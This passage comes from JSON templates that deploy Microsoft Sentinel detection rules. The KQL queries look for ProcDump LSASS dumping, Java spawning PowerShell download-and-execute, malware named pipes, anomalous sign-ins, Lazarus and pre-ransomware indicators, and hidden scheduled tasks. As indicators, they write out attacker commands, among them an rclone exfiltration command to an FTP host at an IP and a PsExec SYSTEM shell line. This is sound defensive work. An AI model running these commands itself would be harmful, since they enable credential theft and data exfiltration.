            "T1059",
            "T1574",
            "T1087",
            "T1082"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "fa2f7d8a-6726-465a-aa72-6f6e3d4c99d7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/172621e0-cd4c-4b97-ad9d-8dfe398c5cf9')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/172621e0-cd4c-4b97-ad9d-8dfe398c5cf9')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "DopplePaymer Procdump",
          "description": "This query was originally published in the threat analytics report, Doppelpaymer: More human-operated ransomware. There is also a related blog.\nDoppelPaymer is ransomware that is spread manually by human operators. These operators have exhibited extensive knowledge of system administration and common network security misconfigurations. For example, they use SysInternal utilities such as ProcDump to dump credentials from LSASS. They often use these stolen credentials to turn off security software, run malicious commands, and spread malware throughout an organization.\nThe following query detects ProcDump being used to dump credentials from LSASS.\nThe See also section below lists links to other queries associated with DoppelPaymer.\nReferences:\nhttps://msrc-blog.microsoft.com/2019/11/20/customer-guidance-for-the-dopplepaymer-ransomware/\nhttps://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/DoppelPaymer.KM!MTB\nhttps://docs.microsoft.com/sysinternals/downloads/procdump\nhttps://docs.microsoft.com/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection",
          "severity": "High",
          "enabled": true,
          "query": "// Dumping of LSASS memory using procdump\nDeviceProcessEvents\n// Command lines that include \"lsass\" and -accepteula or -ma flags used in procdump\n| where (ProcessCommandLine has \"lsass\" and (ProcessCommandLine has \"-accepteula\" or\nProcessCommandLine contains \"-ma\"))\n// Omits possible FPs where the full command is just \"procdump.exe lsass\"\nor (FileName in~ ('procdump.exe','procdump64.exe') and ProcessCommandLine has 'lsass')\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1003"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "1be34fb9-f81b-47ae-84fb-465e6686d76c",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/430c114d-77d4-4205-a6d2-ddd14eae7d55')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/430c114d-77d4-4205-a6d2-ddd14eae7d55')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Java Executing cmd to run Powershell",
          "description": "This query was originally published in the threat analytics report, Sysrv botnet evolution.\nSysrv is a Go-based botnet that targets both Windows and Linux servers, and steals resources to mine cryptocurrency.\nThe following query finds instances of the Java process being used to execute cmd.exe, and download and execute a PowerShell script.",
          "severity": "High",
          "enabled": true,
          "query": "DeviceProcessEvents                         \n| where InitiatingProcessFileName == 'java.exe' and FileName == 'cmd.exe' \nand ProcessCommandLine has_all('powershell iex','DownloadString')\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "2c81c0a0-9823-4a14-b21a-2b4acd3335d2",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c44ba995-ea8f-44d8-aa52-a9d108fd137d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c44ba995-ea8f-44d8-aa52-a9d108fd137d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "C2-NamedPipe",
          "description": "Detects the creation of a named pipe used by known APT malware.\nReference - https://docs.microsoft.com/openspecs/windows_protocols/ms-wpo/4de75e21-36fd-440a-859b-75accc74487c",
          "severity": "High",
          "enabled": true,
          "query": "// this is what should be constantly tweaked with default C2 framework names, search uses has_any (wildcard)\nlet badPipeNames = pack_array(\n    '\\\\psexec',                                     // PSexec default pipe\n    '\\\\paexec',                                     // PSexec default pipe\n    '\\\\remcom',                                     // PSexec default pipe\n    '\\\\csexec',                                     // PSexec default pipe\n    '\\\\isapi_http',                                 // Uroburos Malware Named Pipe\n    '\\\\isapi_dg',                                   // Uroburos Malware Named Pipe\n    '\\\\isapi_dg2',                                  // Uroburos Malware Named Pipe\n    '\\\\sdlrpc',                                     // Cobra Trojan Named Pipe http://goo.gl/8rOZUX\n    '\\\\ahexec',                                     // Sofacy group malware\n    '\\\\winsession',                                 // Wild Neutron APT malware https://goo.gl/pivRZJ\n    '\\\\lsassw',                                     // Wild Neutron APT malware https://goo.gl/pivRZJ\n    '\\\\46a676ab7f179e511e30dd2dc41bd388',           // Project Sauron https://goo.gl/eFoP4A\n    '\\\\9f81f59bc58452127884ce513865ed20',           // Project Sauron https://goo.gl/eFoP4A\n    '\\\\e710f28d59aa529d6792ca6ff0ca1b34',           // Project Sauron https://goo.gl/eFoP4A\n    '\\\\rpchlp_3',                                   // Project Sauron https://goo.gl/eFoP4A - Technical Analysis Input\n    '\\\\NamePipe_MoreWindows',                       // US-CERT Alert - RedLeaves https://www.us-cert.gov/ncas/alerts/TA17-117A\n    '\\\\pcheap_reuse',                               // Pipe used by Equation Group malware 77486bb828dba77099785feda0ca1d4f33ad0d39b672190079c508b3feb21fb0\n    '\\\\gruntsvc',                                   // Covenant default named pipe\n    '\\\\583da945-62af-10e8-4902-a8f205c72b2e',       // SolarWinds SUNBURST malware report https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\n    '\\\\bizkaz',                                     // Snatch Ransomware https://thedfirreport.com/2020/06/21/snatch-ransomware/\n    '\\\\atctl',                                      // https://www.virustotal.com/#/file/a4ddb2664a6c87a1d3c5da5a5a32a5df9a0b0c8f2e951811bd1ec1d44d42ccf1/detection\n    '\\\\userpipe',                                   // ruag apt case\n    '\\\\iehelper',                                   // ruag apt case\n    '\\\\sdlrpc',                                     // project cobra https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra\n    '\\\\comnap',                                     // https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra\n    '\\\\lsadump',                                    // Cred Dump-Tools Named Pipes\n    '\\\\cachedump',                                  // Cred Dump-Tools Named Pipes\n    '\\\\wceservicepipe',                             // Cred Dump-Tools Named Pipes\n    '\\\\jaccdpqnvbrrxlaf',                           // PoshC2 default named pipe\n    '\\\\svcctl',                                     // CrackMapExec default named pipe\n    '\\\\csexecsvc'                                   // CSEXEC default named pipe\n    '\\\\status_',                                    // CS default named pipes https://github.com/Neo23x0/sigma/issues/253\n    '\\\\MSSE-',                                      // CobaltStrike default named pipe\n    '\\\\status_',                                    // CobaltStrike default named pipe\n    '\\\\msagent_',                                   // (target) CobaltStrike default named pipe\n    '\\\\postex_ssh_',                                // CobaltStrike default named pipe\n    '\\\\postex_',                                    // CobaltStrike default named pipe\n    '\\\\Posh'                                        // PoshC2 default named pipe\n);\nDeviceEvents\n| where ActionType == \"NamedPipeEvent\"\n| extend ParsedFields=parse_json(AdditionalFields)\n| where ParsedFields.FileOperation == \"File created\"\n| where ParsedFields.PipeName has_any (badPipeNames)\n| project TimeGenerated, ActionType, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, ParsedFields.FileOperation, ParsedFields.PipeName\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1105"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "7ce00cba-f76f-4026-ab7f-7e4f1b67bd18",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0a5ecddf-c192-4b57-bf36-0c5ff8025d0c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0a5ecddf-c192-4b57-bf36-0c5ff8025d0c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Anomalous Sign-In Detection with UEBA Insights -  Custom",
          "description": "This query identifies successful sign-ins within a specified time range and cross-references them against historical sign-in data to detect potentially inactive users. It then enriches this data with user behavior analytics (UEBA), focusing on sign-ins marked as \"first-time\" activities or those with high investigation priority. Finally, it filters out newly created user accounts from the last 7 days to highlight sign-ins that could indicate unusual or risky behavior. The output includes key sign-in details along with any relevant UEBA insights for further investigation.",
          "severity": "Medium",
          "enabled": true,
          "query": "let starttime = now();\nlet endtime = now() - 6h;// Look at the last 6 hours of data\nlet lookback = starttime - 7d;// Compare with the last 7 days of data\nlet midtime = starttime - 3d;//Exclude users created in the last 3 days\nlet SigninsSummary = SigninLogs\n    | where TimeGenerated between(starttime .. endtime)\n    // successful sign-in only\n    | where ResultType == 0\n    | summarize\n        StartTime = min(TimeGenerated),\n        EndTime = max(TimeGenerated),\n        SigninLogs_ItemIds = make_set(_ItemId),\n        loginCountToday=count()\n        by UserPrincipalName, UserId, UserType, IPAddress\n    | join kind=leftanti (\n        SigninLogs\n        // historical successful sign-in\n        | where TimeGenerated between(lookback .. starttime)\n        | where ResultType == 0\n        | summarize by UserId\n        )\n        on UserId;\n// need to help BehaviorAnalytics query to limit only to Signins we are interested in\nlet onlyInactive = SigninsSummary\n    | summarize make_set(UserPrincipalName);\nlet SigninsWithUEBA =\n    BehaviorAnalytics\n    | where TimeGenerated between(starttime .. endtime)\n    | where ActionType in ('Sign-in', 'InteractiveLogon')\n    | where UserPrincipalName in~ (onlyInactive)\n    | extend ActivityInsights = parse_xml(ActivityInsights)\n    // only looked where FirstTimeUser items are True\n    | where ActivityInsights matches regex '\\\"FirstTimeUser([A-Za-z0-9]+)\\\":\\\"True\\\"'\n    // only exclude when Uncommon Among Peers is false as this helps remove expected first time usage, exception is we always show FirstTimeUserConnectedFromCountry == True\n    // also always keep InvestigationPriority if 1 or more\n    | where (not(ActivityInsights.FirstTimeUserUsedApp == 'True' and ActivityInsights.AppUncommonlyUsedAmongPeers == 'False') or InvestigationPriority > 0)\n    | where (not(ActivityInsights.FirstTimeUserConnectedViaBrowser == 'True' and ActivityInsights.BrowserUncommonlyUsedAmongPeers == 'False') or InvestigationPriority > 0)\n    | where (not(ActivityInsights.FirstTimeUserAccessedResource == 'True' and ActivityInsights.ResourceUncommonlyUsedAmongPeers == 'False') or InvestigationPriority > 0)\n    // for ISP, it makes more sense to exclude if Uncommon in Tenant or Uncommon among peers is false.\n    | where (not(ActivityInsights.FirstTimeUserConnectedViaISP == 'True' and (ActivityInsights.ISPUncommonlyUsedInTenant == 'False' or ActivityInsights.ISPUncommonlyUsedAmongPeers == 'False')) or InvestigationPriority > 0)\n    | extend UEBA_Insights = pack_dictionary(\"TimeGenerated\", TimeGenerated, \"ActivityInsights\", ActivityInsights, \"UsersInsights\", UsersInsights, \"DevicesInsights\", DevicesInsights)\n    | summarize\n        UEBA_ItemIds = make_set(_ItemId),\n        UEBA_SourceRecordIds = make_set(SourceRecordId),\n        UEBA_Insights = make_set(UEBA_Insights)\n        by\n        UEBA_UserPrincipalName = UserPrincipalName,\n        JoinedWithType = Type,\n        UEBA_ActionType = ActionType,\n        UEBA_SourceIPAddress = SourceIPAddress,\n        UEBA_SourceIPLocation = SourceIPLocation,\n        UEBA_InvestigationPriority = InvestigationPriority\n    | extend UEBA_Info = pack_dictionary(\"UEBA_Insights\", UEBA_Insights, \"UEBA_ItemIds\", UEBA_ItemIds, \"UEBA_SourceRecordIds\", UEBA_SourceRecordIds)\n    | project-away UEBA_ItemIds, UEBA_SourceRecordIds, UEBA_Insights\n    | join kind=inner ( \n        SigninsSummary\n        )\n        on\n        $left.UEBA_UserPrincipalName == $right.UserPrincipalName,\n        $left.UEBA_SourceIPAddress == $right.IPAddress\n    | project-reorder\n        StartTime,\n        EndTime,\n        UserPrincipalName,\n        UserId,\n        IPAddress,\n        UserType,\n        loginCountToday,\n        JoinedWithType\n;\nSigninsWithUEBA \n| join kind= leftanti (\n    // filter out newly created user accounts from last 7 days\n    AuditLogs\n    | where TimeGenerated between(midtime .. endtime)\n    | where OperationName == \"Add user\"\n    | summarize by NewUserId = tostring(TargetResources[0].id)\n    )\n    on $left.UserId == $right.NewUserId\n| extend\n    timestamp = StartTime,\n    AccountCustomEntity = UserPrincipalName,\n    IPCustomEntity = IPAddress\n",
          "queryFrequency": "PT6H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/938f2678-7b98-4bfc-a99d-70667d184f43')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/938f2678-7b98-4bfc-a99d-70667d184f43')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Lazarus Zero Day Analytic Rule",
          "description": "Lazarus Zero Day Analytic Rule",
          "severity": "Medium",
          "enabled": true,
          "query": "// Lazarus Korean APT Known malicious process activities\nlet MaliciousFiles = dynamic([\"AmazonVNC.exe\", \"version.dll\", \"aws.cfg\"]);\nlet MaliciousDomains = dynamic([\"henraux.com\"]);\nlet SuspiciousProcesses = dynamic([\"cmd.exe\", \"IExpress.exe\"]);\nlet timeWindow = 30d;\nlet MaliciousFileExecution = \n    SecurityEvent\n    | where TimeGenerated > ago(timeWindow)\n    | where EventID == 4688\n    | where Process  in (MaliciousFiles)\n    | project TimeGenerated, Computer, AccountName, ProcessId, Process, CommandLine, ParentProcessName, LogonTypeName;\nlet MaliciousDNSQuery = \n    DnsEvents\n    | where TimeGenerated > ago(timeWindow)\n    | where Name has_any (MaliciousDomains)\n    | project TimeGenerated, Computer, IPAddresses, Name, ClientIP, QueryType, ResultCode, EventId;\nlet ProcessInjectionDetection = \n    SecurityEvent\n    | where TimeGenerated > ago(timeWindow)\n    | where EventID == 4688 // Process injection event (Sysmon)\n    | where Process == \"IExpress.exe\" or Process== \"aws.cfg\"\n    | project TimeGenerated, Computer, AccountName, ProcessId, Process, Activity, LogonTypeName;\nlet network_matches = DeviceNetworkEvents\n| where TimeGenerated > ago(timeWindow)\n| where RemoteUrl contains (MaliciousDomains);\n// Combine results\nMaliciousFileExecution\n| where TimeGenerated > ago(timeWindow)\n| union network_matches\n| union MaliciousDNSQuery\n| union ProcessInjectionDetection\n| sort by TimeGenerated desc\n",
          "queryFrequency": "PT8H",
          "queryPeriod": "PT8H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Persistence",
            "CommandAndControl"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8b858214-bb56-4704-a2f1-799839f92bdd')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8b858214-bb56-4704-a2f1-799839f92bdd')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Broadcom Threat Alert - Pre-Ransomware Indicators",
          "description": "Symantec has observed suspicious activity that bears the hallmarks of an attempted ransomware attack. Although no payload was deployed, the toolset \nused is typical of a ransomware actor. The attackers attempted to deploy multiple variants of Rclone on the targeted network, all of which were blocked. \nRclone is widely used for data exfiltration by ransomware attackers. \nOne of the most noteworthy features of the attack was the attackers' use of two living-off-the-land Windows tools, the Microsoft Advanced User Control \nPanel (netplwiz.exe) and the Microsoft Management Console (mmc.exe) local users and groups snap-in. Used in conjunction, the tools can be used to \nperform tasks relating to managing user accounts in Windows 10 and 11, such as disabling/enabling auto-login or changing the user profile. Since the \ntools were leveraged after the first attempt to deploy Rclone was blocked, the attackers may have been attempting to elevate the user account privileges to \nadministrator level. \nOther features of the attack included the use of NetScan for network reconnaissance, deployment of the KillAV malicious driver tool (masquerading as a \nSymantec file), and the use of Notepad for the execution of unknown Internet Explorer cached files.",
          "severity": "High",
          "enabled": true,
          "query": "// Time window for the query\nlet timeWindow = 30d;\nlet known_hashes = dynamic([\n    \"55c4b75fb81c0f674c668665c69aba6337a6c51400a71509211e0d6f24ec868e\",\n    \"629f44e56fa2c016d7121e1c380cc98ffd4e0163c3a1fe6337a09bf94659f9fe\",\n    \"640e7e73f7c4cfc1327d3e3b084ba5cd3d2fe322fb86ef61dac8cbaff043b20c\",\n    \"8a878d4c2dff7ae0ec4f20c9ddbbe40b1d6c801d07b9db04597e46b852ea2dc5\",\n    \"c189595c36996bdb7dce6ec28cf6906a00cbb5c5fe182e038bf476d74bed349e\",\n    \"f0bdeae93f385d0242e902deac742ee3a2d3b928996ab9a9f539ed26c496daa1\",\n    \"a68d5d8c2260073a0e5be6a7dd07ff9e01503a06855add72d2f8403a56e93f6e\",\n    \"078163d5c16f64caa5a14784323fd51451b8c831c73396b967b4e35e6879937b\",\n    \"ed92005f95ce30954206f79733b9096d4dd4bf3ac105e70297ae0e1a2072291d\",\n    \"714c533967fe9ea1c8ab7a9b31cfa13f0c1ceebcd4bf4d365f9ae8e95764b983\"\n]);\nlet known_filenames = dynamic([\n    \"symantec2.exe\",\n    \"ns.exe\",\n    \"netscan.exe\",\n    \"rclone.exe\",\n    \"setup.exe\",\n    \"install.exe\",\n    \"serviceinstall.exe\",\n    \"netplwiz.exe\",\n    \"psexec.exe\",\n    \"mmc.exe\",\n    \"notepad.exe\"\n]);\nlet known_commands = dynamic([\n    \"rclone.exe copy --progress --transfers=40 --checkers=20 --drive-chunk-size 64M --max-backlog 999999 --fast-list --ftp-host=45.8.144.155\",\n    \"setup.exe copy --progress --transfers=40 --checkers=20 --drive-chunk-size 64M --max-backlog 999999 --fast-list --ftp-host=45.8.144.155\",\n    \"ServiceInstall.exe -p 1e8469efa94db0507f854832fc3b539f -la\",\n    \"PsExec.exe -i -s cmd.exe\",\n    \"mmc.exe CSIDL_SYSTEM\\\\lusrmgr.msc computername=localmachine\"\n]);\nlet known_ip_addresses = dynamic([\"45.8.144.155\"]);\nlet hash_matches = SecurityEvent\n| where TimeGenerated > ago(timeWindow)\n| where FileHash  in (known_hashes);\nlet filename_and_command_matches = SecurityEvent\n| where TimeGenerated > ago(timeWindow)\n| where Process  in (known_filenames)\n    and CommandLine has_any (known_commands);// Change and for or to view other LOLBin process without known commands.\nlet network_matches = DeviceNetworkEvents\n| where TimeGenerated > ago(timeWindow)\n| where RemoteIP in (known_ip_addresses);\nhash_matches\n| union filename_and_command_matches\n| union network_matches\n| summarize by TimeGenerated, Computer, Process, FileHash, CommandLine, RemoteIP, Account\n| order by TimeGenerated desc\n",
          "queryFrequency": "PT8H",
          "queryPeriod": "PT8H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "DefenseEvasion",
            "CommandAndControl",
            "Exfiltration"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2aabd05b-0aa2-4c8d-aaa7-7b02767851dc')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2aabd05b-0aa2-4c8d-aaa7-7b02767851dc')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Scheduled Task Hide",
          "description": "This query detects attempts by malware to hide the scheduled task by deleting the SD (Security Descriptor) value. Removal of SD value results in the scheduled task disappearing from schtasks /query and Task Scheduler.\n The query requires auditing to be turned on for HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree registry hive as well as audit policy for registry auditing to be turned on.\n Reference: https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/\n Reference: https://4sysops.com/archives/audit-changes-in-the-windows-registry/",
          "severity": "High",
          "enabled": true,
          "query": "SecurityEvent\n| where EventID == 4657\n| extend EventData = parse_xml(EventData).EventData.Data\n| mv-expand bagexpansion=array EventData\n| evaluate bag_unpack(EventData)\n| extend Key = tostring(column_ifexists('@Name', \"\")), Value = column_ifexists('#text', \"\")\n| evaluate pivot(Key, any(Value), TimeGenerated, TargetAccount, Computer, EventSourceName, Channel, Task, Level, EventID, Activity, TargetLogonId, SourceComputerId, EventOriginId, Type, _ResourceId, TenantId, SourceSystem, ManagementGroupName, IpAddress, Account)\n| extend ObjectName = column_ifexists('ObjectName', \"\"), OperationType = column_ifexists('OperationType', \"\"), ObjectValueName = column_ifexists('ObjectValueName', \"\")\n| where ObjectName has 'Schedule\\\\TaskCache\\\\Tree' and ObjectValueName == \"SD\" and OperationType == \"%%1906\"  // %%1906 - Registry value deleted\n| extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n| extend AccountName = tostring(split(TargetAccount, @'\\')[1]), AccountNTDomain = tostring(split(TargetAccount, @'\\')[0])\n| extend timestamp = TimeGenerated\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "6dd2629c-534b-4275-8201-d7968b4fa77e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetAccount"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
